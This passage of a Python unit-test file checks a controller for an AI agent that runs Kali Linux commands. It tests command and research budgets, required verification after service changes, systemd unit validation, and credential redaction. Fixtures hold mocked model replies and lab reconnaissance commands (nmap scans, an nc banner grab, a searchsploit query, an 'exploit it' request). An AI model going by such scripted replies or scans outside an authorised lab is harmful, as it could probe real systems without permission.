                "content": json.dumps({"query": query, "results": []}),
            })

        records = deep_agent._execution_records(messages)
        merged = deep_agent._merge_task_records(records[:1], records[1:])
        workflow = deep_agent.KaliWorkflow("research this service")
        workflow.seed_task_history(merged)

        self.assertEqual(len(merged), len(queries))
        self.assertEqual(workflow.research_calls_started, len(queries))
        self.assertIn("research limit", workflow.begin_research())

    def test_duplicate_verification_requires_a_fresh_post_change_check(self):
        workflow = deep_agent.KaliWorkflow(
            "restart demo.service", requires_goal_check=True,
            requires_preflight_check=True, requires_explicit_change=True,
        )
        check = "systemctl is-active demo.service"
        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="active",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "active\n", "stderr": "",
        }))
        self.assertIn("already attempted", workflow.begin(
            check, purpose="verify", expected_result="active",
        ))

        change = "systemctl start demo.service"
        self.assertIsNone(workflow.begin(change, purpose="change"))
        self.assertIsNone(workflow.finish_command({
            "command": change, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "started\n", "stderr": "",
        }))
        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="active",
        ))

    def test_read_only_commands_can_be_repeated_after_state_changes(self):
        workflow = deep_agent.KaliWorkflow("change Apache and verify its listener")
        listener_check = "ss -tlnp"
        self.assertIsNone(workflow.begin(listener_check, purpose="inspect"))
        self.assertIsNone(workflow.finish_command({
            "command": listener_check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "*:80 LISTEN\n", "stderr": "",
        }))

        change = "systemctl restart apache2"
        self.assertIsNone(workflow.begin(change, purpose="change"))
        self.assertIsNone(workflow.finish_command({
            "command": change, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "", "stderr": "",
        }))
        self.assertFalse(workflow.verification_check_run)
        self.assertIsNone(workflow.verification_condition_met)

        verification = "curl -sS -i http://127.0.0.1:9832/"
        self.assertIsNone(workflow.begin(
            verification, purpose="verify", expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": verification, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "HTTP/1.1 200 OK\n", "stderr": "",
        }))

        self.assertIsNone(workflow.begin(listener_check, purpose="inspect"))

    def test_matching_preflight_stops_unrequested_state_changes(self):
        workflow = deep_agent.KaliWorkflow(
            "host the existing site locally",
            requires_goal_check=True,
            requires_preflight_check=True,
        )
        check = "curl -fsS http://127.0.0.1/"
        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="exit_code=0",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "site response", "stderr": "",
        }))
        issue = workflow.begin("systemctl restart apache2", purpose="change")
        self.assertIn("already exists", issue)
        self.assertIn("already exists", workflow.begin_research())

        explicit_restart = deep_agent.KaliWorkflow(
            "restart Apache", requires_goal_check=True,
            requires_preflight_check=True, requires_explicit_change=True,
        )
        self.assertIsNone(explicit_restart.begin(
            "systemctl is-active apache2", purpose="verify", expected_result="active",
        ))
        self.assertIsNone(explicit_restart.finish_command({
            "command": "systemctl is-active apache2", "execution_state": "completed",
            "exit_code": 0, "timed_out": False, "stdout": "active\n", "stderr": "",
        }))
        self.assertIsNone(explicit_restart.begin("systemctl restart apache2", purpose="change"))

    def test_matched_post_change_outcome_stops_commands_and_research(self):
        workflow = deep_agent.KaliWorkflow(
            "host the site locally", requires_goal_check=True,
            requires_preflight_check=True,
        )
        check = "curl -fsS -i http://127.0.0.1/"
        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "HTTP/1.1 404 Not Found\n", "stderr": "",
        }))
        change = "systemctl restart apache2"
        self.assertIsNone(workflow.begin(change, purpose="change"))
        self.assertIsNone(workflow.finish_command({
            "command": change, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "", "stderr": "",
        }))
        self.assertTrue(workflow.verification_required_before_next_action)

        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "stdout": "HTTP/1.1 200 OK\n", "stderr": "",
        }))
        self.assertTrue(workflow.goal_condition_satisfied)
        self.assertIn("matched after the state change", workflow.begin("ss -tlnp", purpose="inspect"))
        self.assertIn("matched after the state change", workflow.begin_research())

    def test_inconclusive_preflight_blocks_changes_and_allows_a_bounded_retry(self):
        workflow = deep_agent.KaliWorkflow(
            "host the site locally", requires_goal_check=True,
            requires_preflight_check=True,
        )
        check = "curl -fsS -i http://127.0.0.1/"
        for _attempt in range(2):
            self.assertIsNone(workflow.begin(
                check, purpose="verify", expected_result="HTTP/1.1 200 OK",
            ))
            self.assertIsNone(workflow.finish_command({
                "command": check, "execution_state": "completed", "exit_code": 0,
                "timed_out": False, "output_truncated": True,
                "stdout": "", "stderr": "",
            }))
        self.assertIsNone(workflow.preflight_condition_met)
        self.assertTrue(workflow.outcome_check_pending)
        self.assertIn("inconclusive", workflow.begin(
            "systemctl restart apache2", purpose="change",
        ))
        self.assertIn("outcome check must run", workflow.begin_research())

        self.assertIsNone(workflow.begin(
            check, purpose="verify", expected_result="HTTP/1.1 200 OK",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": check, "execution_state": "completed", "exit_code": 0,
            "timed_out": False, "output_truncated": False,
            "stdout": "HTTP/1.1 404 Not Found\n", "stderr": "",
        }))
        self.assertIs(workflow.preflight_condition_met, False)
        self.assertIsNone(workflow.begin("systemctl restart apache2", purpose="change"))

    def test_inconclusive_outcome_check_stops_after_three_attempts(self):
        workflow = deep_agent.KaliWorkflow(
            "host the site locally", requires_goal_check=True,
            requires_preflight_check=True,
        )
        check = "curl -fsS -i http://127.0.0.1/"
        for _attempt in range(kali_workflow.MAX_OUTCOME_CHECK_ATTEMPTS_PER_STATE):
            self.assertIsNone(workflow.begin(
                check, purpose="verify", expected_result="HTTP/1.1 200 OK",
            ))
            self.assertIsNone(workflow.finish_command({
                "command": check, "execution_state": "completed", "exit_code": 0,
                "timed_out": False, "output_truncated": True,
                "stdout": "", "stderr": "",
            }))
        self.assertIn(
            "3-attempt outcome-check limit",
            workflow.begin(check, purpose="verify", expected_result="HTTP/1.1 200 OK"),
        )
        self.assertIs(workflow.state, deep_agent.WorkflowState.BLOCKED)

    def test_foreground_server_timeout_requires_state_check_even_if_mislabeled(self):
        workflow = deep_agent.KaliWorkflow(
            "host the local site", requires_goal_check=True,
            requires_preflight_check=True,
        )
        preflight = "curl -fsS http://127.0.0.1:5173/"
        self.assertIsNone(workflow.begin(
            preflight, purpose="verify", expected_result="exit_code=0",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": preflight, "execution_state": "completed", "exit_code": 7,
            "timed_out": False, "stdout": "", "stderr": "connection refused",
        }))
        self.assertIsNone(workflow.begin("npm run dev", purpose="inspect"))
        self.assertIsNone(workflow.finish_command({
            "command": "npm run dev", "execution_state": "timed_out", "exit_code": 124,
            "timed_out": True, "failure_type": "LONG_RUNNING_PROCESS_USED_AS_ONE_SHOT",
        }))
        self.assertIs(workflow.state, deep_agent.WorkflowState.PLANNING)
        self.assertTrue(workflow.change_attempted)
        self.assertTrue(workflow.verification_required_before_next_action)

    def test_workflow_duplicate_check_ignores_outer_spacing_but_preserves_quoted_content(self):
        workflow = deep_agent.KaliWorkflow("test")
        self.assertIsNone(workflow.begin("ss -tln"))
        self.assertIsNone(workflow.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertIn("already attempted", workflow.begin("  ss   -tln  "))

        distinct_quoted_value = deep_agent.KaliWorkflow("test")
        self.assertIsNone(distinct_quoted_value.begin("printf 'one  two'"))
        self.assertIsNone(distinct_quoted_value.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertIsNone(distinct_quoted_value.begin("printf 'one two'"))

    def test_workflow_records_complete_successful_open_tcp_discovery(self):
        target = "192.168.56.101"
        workflow = deep_agent.KaliWorkflow("assessment", scope_target=target)
        command = f"nmap -n -sT -sV --top-ports 100 --host-timeout 45s {target}"
        self.assertIsNone(workflow.begin(command))
        self.assertIsNone(workflow.finish_command({
            "command": command,
            "execution_state": "completed",
            "exit_code": 0,
            "timed_out": False,
            "output_truncated": False,
            "stdout": "PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n111/tcp  closed rpcbind\n",
        }))
        self.assertTrue(workflow.port_discovery_complete)
        self.assertEqual(workflow.discovered_tcp_ports, {22, 80})

    def test_workflow_enforces_command_budget_without_running_extra_steps(self):
        workflow = deep_agent.KaliWorkflow("test", max_commands=1)
        self.assertIsNone(workflow.begin("hostname"))
        workflow.finish_command({"execution_state": "completed", "exit_code": 0})
        self.assertIn("1-command limit", workflow.begin("whoami"))
        self.assertIs(workflow.state, deep_agent.WorkflowState.BLOCKED)

    def test_workflow_limits_research_and_requires_verification_before_lookup(self):
        budget = deep_agent.KaliWorkflow("research task")
        for _ in range(kali_workflow.MAX_RESEARCH_CALLS_PER_WORKFLOW):
            self.assertIsNone(budget.begin_research())
        self.assertIn("research limit", budget.begin_research())

        workflow = deep_agent.KaliWorkflow("start service", requires_goal_check=True)
        self.assertIsNone(workflow.begin("systemctl start demo.service", purpose="change"))
        self.assertIsNone(workflow.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertIn("outcome check must run before research", workflow.begin_research())
        self.assertEqual(workflow.research_calls_started, 0)
        self.assertIsNone(workflow.begin(
            "systemctl is-active demo.service", purpose="verify",
            expected_result="active",
        ))
        self.assertIsNone(workflow.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "stdout": "active\n", "stderr": "",
        }))
        self.assertIs(workflow.verification_condition_met, True)
        self.assertIn("condition 'active' matched after the state change", workflow.prompt_state())
        self.assertIn("matched after the state change", workflow.begin_research())

    def test_missing_expectations_are_inferred_or_demoted_but_verify_still_requires_one(self):
        inferred = deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {"command": "nmap -n -sT 127.0.0.1"},
        )]})
        self.assertEqual(inferred[1]["expected_result"], "open")
        demoted = deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
            "run_kali_command",
            {"command": "printf probe", "purpose": "test", "hypothesis": "probe succeeds"},
        )]})
        self.assertEqual(demoted[1]["expected_result"], "")
        with self.assertRaisesRegex(ValueError, "verification call must state an output marker"):
            deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {"command": "ls /var/www", "purpose": "verify"},
            )]})
        valid = deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
            "run_kali_command", {
                "command": "nmap -n -sT 127.0.0.1", "purpose": "inspect",
                "hypothesis": "host scan", "expected_result": "exit_code=0",
            },
        )]})
        self.assertEqual(valid[1]["expected_result"], "exit_code=0")
        self.assertEqual(
            deep_agent._effective_tool_purpose(
                valid[1]["command"], valid[1]["purpose"], valid[1]["expected_result"],
                deep_agent.KaliWorkflow("scan task"),
            ),
            "test",
        )

    def test_invalid_tool_purpose_is_normalized_from_label_or_command(self):
        diagnostics = []
        with patch.object(deep_agent, "CONTROLLER_DIAGNOSTICS", diagnostics):
            preflight = deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {
                    "command": "ss -tlnp", "purpose": "preflight",
                    "expected_result": "9832",
                },
            )]})
            change = deep_agent._tool_request({"tool_calls": [deep_agent._make_tool_call(
                "run_kali_command", {
                    "command": "systemctl restart apache2", "purpose": "action",
                },
            )]})

        self.assertEqual(preflight[1]["purpose"], "verify")
        self.assertEqual(change[1]["purpose"], "change")
        self.assertEqual(len(diagnostics), 2)
        self.assertTrue(all(item["event"] == "MODEL_TOOL_CALL_NORMALIZED" for item in diagnostics))
        self.assertTrue(all(item["controller_rejected"] is False for item in diagnostics))
        self.assertEqual(diagnostics[0]["normalized_purpose"], "verify")
        self.assertEqual(diagnostics[1]["normalized_purpose"], "change")

    def test_chat_normalizes_invalid_purpose_without_retrying_a_read_only_command(self):
        call = deep_agent._make_tool_call("run_kali_command", {
            "command": "hostname -I",
            "purpose": "observation",
        })
        kali, calls, output = self._run_chat(
            ["What is my IP?"],
            [{"content": "", "tool_calls": [call]},
             {"content": "Kali reported 192.168.56.101.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("hostname -I")
        self.assertEqual(len(calls), 2)
        self.assertIn("Kali reported 192.168.56.101", output)
        self.assertEqual(len(deep_agent.CONTROLLER_DIAGNOSTICS), 1)
        diagnostic = deep_agent.CONTROLLER_DIAGNOSTICS[0]
        self.assertEqual(diagnostic["event"], "MODEL_TOOL_CALL_NORMALIZED")
        self.assertFalse(diagnostic["controller_rejected"])
        self.assertEqual(diagnostic["normalized_purpose"], "inspect")

    def test_missing_test_expectation_is_inferred_from_command_semantics(self):
        probe = deep_agent._make_tool_call("run_kali_command", {
            "command": "nmap -n -sT 127.0.0.1",
        })
        kali, calls, _ = self._run_chat(
            ["probe 127.0.0.1"],
            [{"content": "", "tool_calls": [probe]},
             {"content": "The scan command completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("nmap -n -sT 127.0.0.1")
        self.assertEqual([call[0] for call in calls[:2]], [True, True])
        diagnostic = deep_agent.CONTROLLER_DIAGNOSTICS[-1]
        self.assertEqual(diagnostic["event"], "MODEL_TOOL_CALL_NORMALIZED")
        self.assertFalse(diagnostic["controller_rejected"])
        self.assertIn("expected_result", diagnostic["reason"])

    def test_echoed_report_is_retried_as_tool_call(self):
        report = ("Services: ssh 22, http 80, ftp 21. Next steps: 1. probe ftp, "
                  "2. check weak creds, 3. research exploits.")
        probe = deep_agent._make_tool_call("run_kali_command", {"command": "nc -vv 127.0.0.1 21"})
        kali, calls, output = self._run_chat(
            ["look for attack vectors", "go ahead"],
            [{"content": report, "tool_calls": []},
             {"content": report, "tool_calls": []},
             {"content": "", "tool_calls": [probe]},
             {"content": "FTP banner grabbed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("nc -vv 127.0.0.1 21")
        self.assertTrue(any("repeated your previous report" in call[2][-1]["content"]
                            for call in calls))

    def test_exploit_it_reuses_recent_lab_target_for_scoped_workflow(self):
        scan = deep_agent._make_tool_call("run_kali_command", {
            "command": "nmap -n -sT -F --host-timeout 45s 192.168.56.101"})
        version = deep_agent._make_tool_call("run_kali_command", {
            "command": "nmap -n -sT -sV -p 21 --host-timeout 45s 192.168.56.101"})
        kali, calls, output = self._run_chat(
            ["scan 192.168.56.101", "exploit it"],
            [{"content": "Quick scan summary.", "tool_calls": []},
             {"content": "", "tool_calls": [version]},
             {"content": "21/tcp open ftp", "tool_calls": []},
             {"content": "Scoped version scan finished.", "tool_calls": []}],
        )
        kali.run.assert_any_call("nmap -n -sT -sV -p 21 --host-timeout 45s 192.168.56.101")
        self.assertNotIn("/exploit PRIVATE_IPV4", output)

    def test_launch_preflight_evaluates_status_check_without_model_marker(self):
        status = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl status demo", "purpose": "verify",
        })
        kali, calls, output = self._run_chat(
            ["launch demo"],
            [{"content": "", "tool_calls": [status]},
             {"content": "The demo service is already running.", "tool_calls": []}],
            run_records=[{"stdout": "● demo.service\n   Active: active (running) since Mon\n"}],
        )
        kali.run.assert_called_once_with("systemctl status demo")
        self.assertIn("already running", output)
        self.assertIn("matched", output)
        diagnostic = deep_agent.CONTROLLER_DIAGNOSTICS[-1]
        self.assertEqual(diagnostic["event"], "MODEL_TOOL_CALL_NORMALIZED")
        self.assertIn("active (running)", diagnostic["reason"])

    def test_controller_diagnostics_redact_inline_credentials(self):
        diagnostics = []
        reply = {"tool_calls": [deep_agent._make_tool_call("run_kali_command", {
            "command": (
                "curl -u labuser:secret "
                "-H \"Authorization: Basic dXNlcjpzZWNyZXQ=\" "
                "-H 'Cookie: session=secret-cookie; csrf=secret-csrf' "
                "https://example.invalid/private"
            ),
        })]}
        with patch.object(deep_agent, "CONTROLLER_DIAGNOSTICS", diagnostics):
            deep_agent._record_controller_diagnostic(
                reply, "test rejection", retry_number=1,
                schema_valid=True, validation_stage="command_policy",
            )
        encoded = json.dumps(diagnostics)
        self.assertNotIn("secret", encoded)
        self.assertNotIn("dXNlcjpzZWNyZXQ=", encoded)
        self.assertIn("example.invalid/private", encoded)
        self.assertIn("[REDACTED]", encoded)

    def test_no_op_action_reply_gets_one_recovery_call_with_execution_facts(self):
        verify = deep_agent._make_tool_call("run_kali_command", {
            "command": "systemctl is-active wazuh-manager",
            "purpose": "verify",
            "hypothesis": "the requested manager service is active",
            "expected_result": "exit_code=0",
        })
        kali, calls, output = self._run_chat(
            ["run wazuh"],
            [{"content": "No response requested.", "tool_calls": []},
             {"content": "", "tool_calls": [verify]},
             {"content": "The manager check completed.", "tool_calls": []}],
        )
        kali.run.assert_called_once_with("systemctl is-active wazuh-manager")
        self.assertEqual(len(calls), 3)
        feedback = calls[1][2][-1]["content"]
        self.assertIn('"TOOL_CALL_RECEIVED": false', feedback)
        self.assertIn('"COMMAND_EXECUTED": false', feedback)
        self.assertIn('"ORIGINAL_GOAL": "run wazuh"', feedback)
        self.assertNotIn("No response requested", output)
        self.assertIn("matched the command exit status", output)
        summary_payload = json.loads(calls[2][2][-1]["content"])
        tool_record = summary_payload["recorded_results"][0]
        self.assertEqual(tool_record["execution"]["execution_state"], "completed")
        self.assertEqual(tool_record["execution"]["exit_code"], 0)
        self.assertEqual(tool_record["purpose"], "verify")

    def test_repeated_no_op_stops_with_a_controller_status(self):
        kali, calls, output = self._run_chat(
            ["run wazuh"],
            [{"content": "No response requested.", "tool_calls": []},
             {"content": "No response requested.", "tool_calls": []}],
        )
        kali.run.assert_not_called()
        self.assertEqual(len(calls), 2)
        self.assertIn("No Kali command ran", output)

    def test_no_action_recovery_budget_survives_confirmation_turns(self):
        no_action = {"content": "No response requested.", "tool_calls": []}
        kali, calls, output = self._run_chat(
            ["run wazuh", "go ahead"],
            [no_action, no_action, no_action],
        )

        kali.run.assert_not_called()
        self.assertEqual(len(calls), 3)
        self.assertIn("single automatic retry", calls[2][2][-1]["content"])
        self.assertIn("recovery attempt was exhausted", output)
        self.assertIn("requested outcome remains unverified", output)

    def test_invalid_tool_repair_budget_survives_confirmation_turns(self):
        invalid = {
            "content": "",
            "tool_calls": [{
                "id": "bad-call",
                "type": "function",
                "function": {"name": "run_kali_command", "arguments": {"command": 3}},
            }],
        }
        kali, calls, output = self._run_chat(
            ["check listening ports", "go ahead"],
            [invalid, invalid, invalid],
        )

        kali.run.assert_not_called()
        self.assertEqual(len(calls), 3)
        self.assertIn("controller-rejected tool requests", output)
        self.assertNotIn("No response requested", output)

    def test_searchsploit_validation_repair_budget_survives_confirmation_turns(self):
        invalid_query = {
            "content": "",
            "tool_calls": [deep_agent._make_tool_call(
                "searchsploit", {"query": "-x"}, call_id="invalid-query",
            )],
        }
        kali, calls, output = self._run_chat(
            ["search for -x", "go ahead"],
            [invalid_query, invalid_query, invalid_query],
        )

        kali.run.assert_not_called()
        self.assertEqual(len(calls), 3)
        self.assertIn("controller-rejected tool requests", output)
        self.assertNotIn("No response requested", output)

    def test_structured_tool_result_states_controller_execution_facts(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "evidence_id": "evidence-1",
            "command": "systemctl is-active wazuh-manager",
            "state": "OBSERVED",
            "execution_state": "completed",
            "exit_code": 3,
            "stdout": "inactive\n",
            "stderr": "",
            "timed_out": False,
            "duration_seconds": 0.2,
            "started_at": "2026-01-01T00:00:00Z",
            "submitted_at": "2026-01-01T00:00:00Z",
            "finished_at": "2026-01-01T00:00:01Z",
            "side_effect_causality": "unknown",
            "output_truncated": False,
        })
        result = json.loads(deep_agent._structured_tool_output(evidence))["command_evidence"]
        self.assertEqual(result["controller_execution"], {
            "TOOL_CALL_RECEIVED": True,
            "CONTROLLER_REJECTED": False,
            "COMMAND_EXECUTED": True,
            "COMMAND_SUBMITTED": True,
            "COMMAND": "systemctl is-active wazuh-manager",
            "EXIT_CODE": 3,
            "STDOUT_PRESENT": True,
            "EXECUTION_STATE": "completed",
        })

    def test_structured_tool_output_compacts_large_package_inventories(self):
        ledger = deep_agent.EvidenceLedger()
        package_lines = [f"package-{index:04d}\t1.0.{index}" for index in range(3232)]
        evidence = ledger.record_command({
            "command": "dpkg-query -W",
            "state": "OBSERVED", "execution_state": "completed", "exit_code": 0,
            "stdout": "\n".join(package_lines), "stderr": "", "timed_out": False,
            "duration_seconds": 0.1, "output_truncated": False,
        })
        result = json.loads(deep_agent._structured_tool_output(evidence))
        command_evidence = result["command_evidence"]
        self.assertEqual(command_evidence["model_context"]["bulk_output"]["record_count"], 3232)
        self.assertTrue(command_evidence["model_context"]["stdout_summarized"])
        self.assertIn("absence from this sample does not prove absence", command_evidence["stdout"].lower())
        self.assertNotIn("package-1234", command_evidence["stdout"])

    def test_structured_tool_output_marks_model_context_omissions(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "command": "cat /var/log/example.log",
            "state": "OBSERVED", "execution_state": "completed", "exit_code": 0,
            "stdout": "line\n" * 10_000, "stderr": "", "timed_out": False,
            "duration_seconds": 0.1, "output_truncated": False,
        })
        result = json.loads(deep_agent._structured_tool_output(evidence))["command_evidence"]
        self.assertTrue(result["model_context"]["stdout_omitted"])
        self.assertFalse(result["output_truncated"])

    def test_contradictory_test_results_consume_hypothesis_budget(self):
        workflow = deep_agent.KaliWorkflow("check endpoint response")
        hypothesis = "response contains READY"
        for index in range(2):
            self.assertIsNone(workflow.begin(
                f"printf probe-{index}", purpose="test", hypothesis=hypothesis,
                expected_result="READY",
            ))
            self.assertIsNone(workflow.finish_command({
                "execution_state": "completed", "exit_code": 0, "timed_out": False,
                "output_truncated": False, "stdout": "DENIED", "stderr": "",
            }))
        self.assertEqual(workflow.hypothesis_failures[hypothesis.lower()], 2)
        self.assertIs(workflow.records[-1]["expected_result_match"], False)
        self.assertIn("Two results failed or contradicted this hypothesis", workflow.prompt_state())

        self.assertIsNone(workflow.begin(
            "printf final-probe", purpose="test", hypothesis=hypothesis,
            expected_result="READY",
        ))
        stop_reason = workflow.finish_command({
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "output_truncated": False, "stdout": "DENIED", "stderr": "",
        })
        self.assertIn("3 results failed or contradicted", stop_reason)
        self.assertIs(workflow.state, deep_agent.WorkflowState.BLOCKED)

    def test_failed_verification_hypothesis_budget_survives_continuation(self):
        hypothesis = "site returns success status"
        prior = [
            {
                "tool_name": "run_kali_command",
                "command": f"curl -sS -i http://127.0.0.1:{8080 + index}/",
                "purpose": "verify",
                "hypothesis": hypothesis,
                "expected_result": "HTTP/1.1 200 OK",
                "execution": {
                    "execution_state": "completed",
                    "exit_code": 0,
                    "expected_result_match": False,
                },
            }
            for index in range(2)
        ]
        workflow = deep_agent.KaliWorkflow("check local site")
        workflow.seed_task_history(prior)

        self.assertEqual(workflow.hypothesis_failures[hypothesis], 2)
        command = "curl -sS -i http://127.0.0.1:8082/"
        self.assertIsNone(workflow.begin(
            command, purpose="verify", hypothesis=hypothesis,
            expected_result="HTTP/1.1 200 OK",
        ))
        stop_reason = workflow.finish_command({
            "command": command,
            "execution_state": "completed",
            "exit_code": 0,
            "timed_out": False,
            "output_truncated": False,
            "stdout": "HTTP/1.1 404 Not Found\n",
            "stderr": "",
        })
        self.assertIn("3 results failed or contradicted", stop_reason)

    def test_expected_nonzero_verification_does_not_consume_failure_budget(self):
        workflow = deep_agent.KaliWorkflow("confirm an expected absent marker")
        self.assertIsNone(workflow.begin(
            "grep -F READY /tmp/status.txt", purpose="verify",
            hypothesis="READY marker is absent", expected_result="exit_code=1",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "grep -F READY /tmp/status.txt",
            "execution_state": "completed", "exit_code": 1, "timed_out": False,
            "stdout": "", "stderr": "", "output_truncated": False,
        }))
        self.assertIs(workflow.verification_condition_met, True)
        self.assertEqual(workflow.hypothesis_failures, {})

    def test_nonzero_inspections_do_not_consume_hypothesis_test_budget(self):
        workflow = deep_agent.KaliWorkflow("inspect Wazuh state")
        hypothesis = "wazuh service is available"
        observations = (
            ("systemctl is-active wazuh-manager", 3),
            ("dpkg-query -W wazuh-manager", 1),
            ("curl -fsS http://127.0.0.1:55000/", 7),
        )
        for command, exit_code in observations:
            with self.subTest(command=command):
                self.assertIsNone(workflow.begin(
                    command, purpose="inspect", hypothesis=hypothesis,
                ))
                self.assertIsNone(workflow.finish_command({
                    "command": command, "execution_state": "completed",
                    "exit_code": exit_code, "timed_out": False,
                    "stdout": "", "stderr": "diagnostic output",
                    "output_truncated": False,
                }))
        self.assertEqual(workflow.hypothesis_failures, {})
        self.assertEqual(workflow.hypothesis_attempts, {})

        test_command = "grep -F READY /tmp/wazuh-status"
        self.assertIsNone(workflow.begin(
            test_command, purpose="test", hypothesis=hypothesis,
            expected_result="READY",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": test_command, "execution_state": "completed",
            "exit_code": 0, "timed_out": False,
            "stdout": "NOT_READY", "stderr": "",
            "output_truncated": False,
        }))
        self.assertEqual(workflow.hypothesis_attempts[hypothesis], 1)
        self.assertEqual(workflow.hypothesis_failures[hypothesis], 1)

    def test_failed_state_change_does_not_consume_hypothesis_test_budget(self):
        workflow = deep_agent.KaliWorkflow("create a local status file")
        hypothesis = "status file can be created"
        command = "touch /tmp/status-file"
        self.assertIsNone(workflow.begin(
            command, purpose="change", hypothesis=hypothesis,
        ))
        self.assertIsNone(workflow.finish_command({
            "command": command, "execution_state": "completed",
            "exit_code": 1, "timed_out": False,
            "stdout": "", "stderr": "permission denied",
            "output_truncated": False,
        }))
        self.assertTrue(workflow.change_attempted)
        self.assertEqual(workflow.hypothesis_failures, {})

    def test_service_manager_state_changes_are_classified_across_common_syntax(self):
        for command in (
            "systemctl start demo.service",
            "systemctl --user restart demo.service",
            "systemctl edit demo.service",
            "service demo start",
            "service demo restart",
        ):
            with self.subTest(command=command):
                self.assertTrue(deep_agent._command_changes_state(command))
        for command in ("systemctl is-active demo.service", "service demo status"):
            with self.subTest(command=command):
                self.assertFalse(deep_agent._command_changes_state(command))

    def test_model_service_changes_require_a_unit_observed_in_command_output(self):
        workflow = deep_agent.KaliWorkflow("start demo")
        issue = deep_agent._model_command_issue(
            "systemctl start demo.service", "start demo", workflow=workflow,
        )
        self.assertIn("systemctl list-unit-files", issue)

        inventory = """UNIT FILE                    STATE   PRESET
demo.service                 disabled enabled
demo.socket                  static   -
"""
        self.assertIsNone(workflow.begin("systemctl list-unit-files", purpose="inspect"))
        self.assertIsNone(workflow.finish_command({
            "command": "systemctl list-unit-files",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "output_truncated": False, "stdout": inventory, "stderr": "",
        }))
        self.assertTrue(workflow.systemd_inventory_complete)
        self.assertEqual(workflow.observed_systemd_units, {"demo.service", "demo.socket"})
        self.assertIsNone(deep_agent._model_command_issue(
            "systemctl --user start demo", "start demo", workflow=workflow,
        ))
        self.assertIsNone(deep_agent._model_command_issue(
            "service demo start", "start demo", workflow=workflow,
        ))
        issue = deep_agent._model_command_issue(
            "systemctl start invented.service", "start demo", workflow=workflow,
        )
        self.assertIn("not observed in the complete", issue)
        self.assertIn("do not guess", issue)

    def test_service_verification_must_check_the_units_that_changed(self):
        workflow = deep_agent.KaliWorkflow("start demo service", requires_goal_check=True)
        self.assertIsNone(workflow.begin(
            "systemctl start demo.service", purpose="change",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "systemctl start demo.service",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertEqual(workflow.pending_systemd_units, {"demo.service"})

        for command in (
            "hostname",
            "systemctl is-active other.service",
            "service other status",
        ):
            with self.subTest(command=command):
                issue = deep_agent._model_command_issue(
                    command, workflow.request, workflow=workflow, purpose="verify",
                )
                self.assertIsNotNone(issue)
                self.assertIn("verification", issue)

        for command in (
            "systemctl is-active demo",
            "systemctl show -p ActiveState demo.service",
            "service demo status",
            "env LANG=C systemctl status demo.service",
            "timeout 5s systemctl is-active demo.service",
        ):
            with self.subTest(command=command):
                self.assertIsNone(deep_agent._model_command_issue(
                    command, workflow.request, workflow=workflow, purpose="verify",
                ))

    def test_multi_unit_change_requires_each_unit_in_the_outcome_check(self):
        workflow = deep_agent.KaliWorkflow("restart demo and worker")
        self.assertIsNone(workflow.begin(
            "systemctl restart demo.service worker.service", purpose="change",
        ))
        self.assertIsNone(workflow.finish_command({
            "command": "systemctl restart demo.service worker.service",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
        }))
        self.assertEqual(workflow.pending_systemd_units, {"demo.service", "worker.service"})
        self.assertIsNotNone(workflow.systemd_verification_issue(
            "systemctl is-active demo.service", "verify",
        ))
        self.assertIsNone(workflow.systemd_verification_issue(
            "systemctl is-active demo.service worker.service", "verify",
        ))

    def test_incomplete_or_filtered_systemd_inventory_is_not_treated_as_complete(self):
        workflow = deep_agent.KaliWorkflow("start demo")
        self.assertIsNone(workflow.begin("systemctl list-unit-files 'demo*'"))
        self.assertIsNone(workflow.finish_command({
            "command": "systemctl list-unit-files 'demo*'",
            "execution_state": "completed", "exit_code": 0, "timed_out": False,
            "output_truncated": False, "stdout": "demo.service disabled enabled\n", "stderr": "",
        }))
        self.assertFalse(workflow.systemd_inventory_complete)
